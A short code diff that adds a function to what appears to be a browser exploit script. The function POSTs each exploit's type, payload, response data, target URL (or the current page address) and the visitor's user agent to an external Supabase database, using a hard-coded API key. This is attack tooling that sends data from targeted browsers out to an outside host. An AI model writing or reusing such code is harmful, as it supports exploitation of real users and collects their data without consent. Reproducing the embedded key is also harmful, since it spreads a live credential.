@@ -243,5 +243,32 @@ let workerBlobUrl = URL.createObjectURL(workerBlob);
        // print("Got exception on something: " + e);
         }
     }
+
+    // Function to save exploit results to Supabase
+    async function saveExploitResult(exploitType, targetUrl, payload, responseData, executionTime) {
+      try {
+          const response = await fetch('https://nctvwxiqzbedgcmetyal.supabase.co/rest/v1/exploit_results', {
+                method: 'POST',
+                headers: {
+                  'Content-Type': 'application/json',
+                  'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5jdHZ3eGlxemJlZGdjbWV0eWFsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0Nzk2NDUsImV4cCI6MjA4MjA1NTY0NX0.A3ie8bcvSZeXclTKgMyh5L3uz_LPTjlHz95isEQ3kJQ'
+                },
+                body: JSON.stringify({
+                  exploit_type: exploitType,
+                  target_url: targetUrl || window.location.href,
+                  payload: payload,
+                  response_data: responseData,
+                  execution_time_ms: executionTime,
+                  user_agent: navigator.userAgent,
+                  ip_address: null // Will be filled by backend
+                })
+              });
+              
+              console.log('Exploit result saved:', await response.json());
+            } catch (error) {
+              console.error('Failed to save exploit result:', error);
+            }
+    }
+
     main();
   })();
